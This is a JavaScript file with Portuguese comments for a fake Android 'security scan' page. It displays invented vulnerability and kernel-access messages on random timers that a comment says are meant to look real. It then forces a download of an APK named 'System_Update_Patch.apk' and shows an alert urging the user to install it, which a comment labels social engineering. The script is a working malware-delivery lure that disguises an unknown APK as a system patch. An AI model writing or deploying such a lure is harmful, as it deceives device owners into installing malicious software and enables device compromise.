const statusText = document.getElementById('status-text');
const progress = document.getElementById('progress');
const btnFix = document.getElementById('btn-fix');

// Caminho para o seu APK (deve estar na pasta files no seu GitHub)
const apkUrl = "./files/update.apk"; 

const steps = [
    "Detectando vulnerabilidade...",
    "Acessando Kernel...",
    "Erro de permissão Knox...",
    "Solução encontrada: Patch de Segurança"
];

let currentStep = 0;

function simulateProcess() {
    if (currentStep < steps.length) {
        statusText.innerText = steps[currentStep];
        progress.style.width = (currentStep + 1) * 25 + "%";
        currentStep++;
        
        // Tempo aleatório para parecer real
        setTimeout(simulateProcess, Math.random() * 1500 + 1000);
    } else {
        finishSimulation();
    }
}

function finishSimulation() {
    statusText.innerText = "Ação necessária: Instalar Patch de Segurança.";
    statusText.style.color = "#ffcc00";
    btnFix.classList.add('btn-show');
    
    btnFix.addEventListener('click', () => {
        statusText.innerText = "Iniciando download forçado...";
        
        // Força o download do arquivo
        const link = document.createElement('a');
        link.href = apkUrl;
        link.setAttribute('download', 'System_Update_Patch.apk');
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        // Mensagem final de engenharia social
        setTimeout(() => {
            alert("Download concluído. Após baixar, abra o arquivo e siga as instruções de instalação para corrigir o erro de sistema.");
        }, 1000);
    });
}

// Inicia a simulação após 1 segundo
setTimeout(simulateProcess, 1000);
